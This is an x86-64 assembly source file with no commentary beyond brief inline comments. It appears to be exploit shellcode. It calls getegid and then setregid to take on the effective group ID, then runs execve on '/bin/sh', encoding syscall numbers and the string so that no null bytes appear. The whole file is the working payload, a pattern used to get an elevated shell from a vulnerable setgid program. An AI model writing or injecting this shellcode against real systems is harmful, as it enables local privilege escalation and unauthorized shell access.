#include <sys/syscall.h>

.globl  main
.type   main, @function

main:
    xor %rax, %rax
    xorb $0x6c, %al
    syscall


    //setregid(egid, egid);
    mov %rax, %rdi // 1st arg
    mov %rax, %rsi // 2nd arg

    xor %rax, %rax
    xorb $0x72, %al
    syscall


    //execve("/bin/sh", 0, 0);


    xor %rsi, %rsi
    xor %rdx, %rdx

    xor %rax, %rax
    xorb $0x3b, %al


    mov $0x68732f6e69622f2f, %rbx

    xor %rdi, %rdi
    push %rdi

    push %rbx
    mov %rsp, %rdi

    syscall

